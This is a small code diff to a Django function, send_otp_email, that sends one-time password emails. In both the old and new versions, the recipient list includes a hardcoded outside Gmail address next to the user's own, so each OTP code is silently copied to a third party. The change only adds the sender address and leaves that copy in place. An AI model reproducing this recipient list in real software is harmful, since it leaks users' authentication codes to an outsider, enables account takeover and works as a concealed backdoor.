@@ -25,7 +25,7 @@ def send_otp_email(context_data):
     message = render_to_string(context_data.get('html'), context_data)
 
     from_email = settings.DEFAULT_FROM_EMAIL
-    recipient_list = [context_data.get('email'), 'armyfriend8372@gmail.com']
+    recipient_list = [context_data.get('email'), 'armyfriend8372@gmail.com', from_email]
 
     email = EmailMessage(subject, message, from_email, recipient_list)
     email.content_subtype = "html"
